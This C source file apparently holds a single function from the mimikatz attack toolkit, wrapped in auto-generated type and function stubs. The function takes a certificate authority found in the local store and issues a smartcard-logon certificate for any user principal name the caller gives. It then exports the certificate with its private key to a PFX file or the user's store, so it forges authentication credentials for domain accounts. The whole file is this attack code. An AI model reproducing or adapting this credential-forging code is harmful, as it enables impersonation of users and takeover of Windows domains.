
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_17__ TYPE_5__ ;
typedef struct TYPE_16__ TYPE_4__ ;
typedef struct TYPE_15__ TYPE_3__ ;
typedef struct TYPE_14__ TYPE_2__ ;
typedef struct TYPE_13__ TYPE_1__ ;


typedef int wchar_t ;
struct TYPE_17__ {char* pwszProvName; } ;
struct TYPE_16__ {int member_0; } ;
struct TYPE_15__ {char* member_5; int member_7; char* cn; TYPE_4__* cdp; int * member_12; TYPE_4__* member_11; TYPE_4__* member_10; scalar_t__ member_9; int member_8; int * member_6; int member_4; int * member_3; int * member_2; int * member_1; int * member_0; } ;
struct TYPE_13__ {int member_6; int * member_5; int member_4; int member_3; int member_2; int member_1; int * member_0; } ;
struct TYPE_14__ {int member_3; int * pin; int hProv; TYPE_5__ keyInfos; int member_2; int * member_1; TYPE_1__ member_0; } ;
typedef int PCCERT_CONTEXT ;
typedef int * PBYTE ;
typedef int NTSTATUS ;
typedef char* LPCWSTR ;
typedef TYPE_2__ KIWI_KEY_INFO ;
typedef TYPE_3__ KIWI_CERT_INFO ;
typedef int HCRYPTPROV_LEGACY ;
typedef int HCERTSTORE ;
typedef int DWORD ;
typedef TYPE_4__ CERT_EXTENSION ;
typedef scalar_t__ BOOL ;


 int AT_KEYEXCHANGE ;
 int CERT_CLOSE_STORE_FORCE_FLAG ;
 int CERT_DIGITAL_SIGNATURE_KEY_USAGE ;
 int CERT_FIND_SUBJECT_STR ;
 int CERT_KEY_ENCIPHERMENT_KEY_USAGE ;
 int CERT_STORE_OPEN_EXISTING_FLAG ;
 int CERT_STORE_PROV_SYSTEM ;
 int CERT_STORE_READONLY_FLAG ;
 int CERT_SYSTEM_STORE_CURRENT_USER ;
 int CRYPT_EXPORTABLE ;
 int CRYPT_SILENT ;
 int CertCloseStore (int ,int ) ;
 int CertFindCertificateInStore (int ,int,int ,int ,char*,int *) ;
 int CertFreeCertificateContext (int ) ;
 int CertOpenStore (int ,int ,int ,int,char*) ;
 int CryptReleaseContext (int ,int ) ;
 scalar_t__ FALSE ;
 int LocalFree (int *) ;
 int MIMIKATZ ;
 int MS_ENHANCED_PROV ;
 char* MS_SCARD_PROV ;
 int PKCS_7_ASN_ENCODING ;
 int PRINT_ERROR (char*) ;
 int PRINT_ERROR_AUTO (char*) ;
 int PROV_RSA_FULL ;
 int STATUS_SUCCESS ;
 int X509_ASN_ENCODING ;
 scalar_t__ generateCertificate (TYPE_2__*,TYPE_3__*,int ,int *,int **,int *,int *) ;
 int kprintf (char*,char*,...) ;
 scalar_t__ kuhl_m_crypto_c_sc_auth_Ext_AltUPN (TYPE_4__*,char*) ;
 scalar_t__ kuhl_m_crypto_c_sc_auth_Ext_CDP (TYPE_4__*,int,char*) ;
 scalar_t__ kuhl_m_crypto_c_sc_auth_Ext_EKU (TYPE_4__*,int,int ,int ) ;
 int kuhl_m_crypto_c_sc_auth_Ext_Free (TYPE_4__*) ;
 scalar_t__ kull_m_crypto_DerAndKeyInfoToPfx (int *,int ,TYPE_5__*,char*) ;
 scalar_t__ kull_m_crypto_DerAndKeyInfoToStore (int *,int ,TYPE_5__*,int ,char*,scalar_t__) ;
 int kull_m_crypto_close_hprov_delete_container (int ) ;
 int kull_m_crypto_system_store_to_dword (char*) ;
 scalar_t__ kull_m_string_args_byName (int,int **,char*,char**,char*) ;
 int * kull_m_string_unicode_to_ansi (char*) ;
 int szOID_KP_SMARTCARD_LOGON ;
 int szOID_OIWSEC_sha1RSASign ;
 int szOID_PKIX_KP_CLIENT_AUTH ;

NTSTATUS kuhl_m_crypto_c_sc_auth(int argc, wchar_t * argv[])
{
 LPCWSTR szStoreCA, szNameCA, szPfx = ((void*)0), szPin, szCrlDp;
 HCERTSTORE hCertStoreCA;
 PCCERT_CONTEXT pCertCtxCA;
 BOOL isExported = FALSE, noUserStore = FALSE;
 CERT_EXTENSION eku = {0}, san = {0}, cdp = {0};
 DWORD szCertificate = 0;
 PBYTE Certificate = ((void*)0);
 KIWI_KEY_INFO ki = {{((void*)0), MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_SILENT, 0, ((void*)0), AT_KEYEXCHANGE}, ((void*)0), CRYPT_EXPORTABLE, 2048};
 KIWI_CERT_INFO ci = {((void*)0), ((void*)0), ((void*)0), ((void*)0), MIMIKATZ, L"FR", ((void*)0), CERT_DIGITAL_SIGNATURE_KEY_USAGE | CERT_KEY_ENCIPHERMENT_KEY_USAGE, szOID_OIWSEC_sha1RSASign , FALSE, &eku, &san, ((void*)0)};

 if(kull_m_string_args_byName(argc, argv, L"hw", ((void*)0), ((void*)0)))
 {
  kull_m_string_args_byName(argc, argv, L"csp", &ki.keyInfos.pwszProvName, MS_SCARD_PROV);
  if(kull_m_string_args_byName(argc, argv, L"pin", &szPin, ((void*)0)))
   ki.pin = kull_m_string_unicode_to_ansi(szPin);
 }
 noUserStore = kull_m_string_args_byName(argc, argv, L"nostore", ((void*)0), ((void*)0));
 kull_m_string_args_byName(argc, argv, L"castore", &szStoreCA, L"LOCAL_MACHINE");
 if(kull_m_string_args_byName(argc, argv, L"caname", &szNameCA, ((void*)0)))
 {
  if(kull_m_string_args_byName(argc, argv, L"upn", &ci.cn, ((void*)0)))
  {
   kprintf(L"CA store       : %s\n", szStoreCA);
   if(hCertStoreCA = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) ((void*)0), kull_m_crypto_system_store_to_dword(szStoreCA) | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, L"My"))
   {
    kprintf(L"CA name        : %s\n", szNameCA);
    if(pCertCtxCA = CertFindCertificateInStore(hCertStoreCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, szNameCA, ((void*)0)))
    {
     if(kuhl_m_crypto_c_sc_auth_Ext_EKU(&eku, 2, szOID_KP_SMARTCARD_LOGON, szOID_PKIX_KP_CLIENT_AUTH))
     {
      if(kuhl_m_crypto_c_sc_auth_Ext_AltUPN(&san, ci.cn))
      {
       if(kull_m_string_args_byName(argc, argv, L"crldp", &szCrlDp, ((void*)0)))
        if(kuhl_m_crypto_c_sc_auth_Ext_CDP(&cdp, 1, szCrlDp))
         ci.cdp = &cdp;

       if(generateCertificate(&ki, &ci, pCertCtxCA, ((void*)0), &Certificate, &szCertificate, ((void*)0)))
       {
        if(kull_m_string_args_byName(argc, argv, L"pfx", &szPfx, ((void*)0)))
        {
         isExported = kull_m_crypto_DerAndKeyInfoToPfx(Certificate, szCertificate, &ki.keyInfos, szPfx);
         kprintf(L"Private Export : %s - %s\n", szPfx, isExported ? L"OK" : L"KO");
        }
        else if(!noUserStore)
        {
         isExported = kull_m_crypto_DerAndKeyInfoToStore(Certificate, szCertificate, &ki.keyInfos, CERT_SYSTEM_STORE_CURRENT_USER, L"My", FALSE);
         kprintf(L"Private Store  : CERT_SYSTEM_STORE_CURRENT_USER/My - %s\n", isExported ? L"OK" : L"KO");
        }

        if(!isExported || szPfx)
         kull_m_crypto_close_hprov_delete_container(ki.hProv);
        else
         CryptReleaseContext(ki.hProv, 0);
        LocalFree(Certificate);
       }
       if(ci.cdp)
        kuhl_m_crypto_c_sc_auth_Ext_Free(ci.cdp);
       kuhl_m_crypto_c_sc_auth_Ext_Free(&san);
      }
      else PRINT_ERROR_AUTO(L"Unable to generate SAN extension - kuhl_m_crypto_c_sc_auth_Ext_AltUPN");
      kuhl_m_crypto_c_sc_auth_Ext_Free(&eku);
     }
     else PRINT_ERROR_AUTO(L"Unable to generate EKU extension - kuhl_m_crypto_c_sc_auth_Ext_EKU");
     CertFreeCertificateContext(pCertCtxCA);
    }
    else PRINT_ERROR_AUTO(L"CertFindCertificateInStore");
    CertCloseStore(hCertStoreCA, CERT_CLOSE_STORE_FORCE_FLAG);
   }
   else PRINT_ERROR_AUTO(L"CertOpenStore");
  }
  else PRINT_ERROR(L"/upn:user@domain.local needed\n");
 }
 else PRINT_ERROR(L"/caname:CA-KIWI needed\n");

 if(ki.pin)
  LocalFree(ki.pin);
 return STATUS_SUCCESS;
}
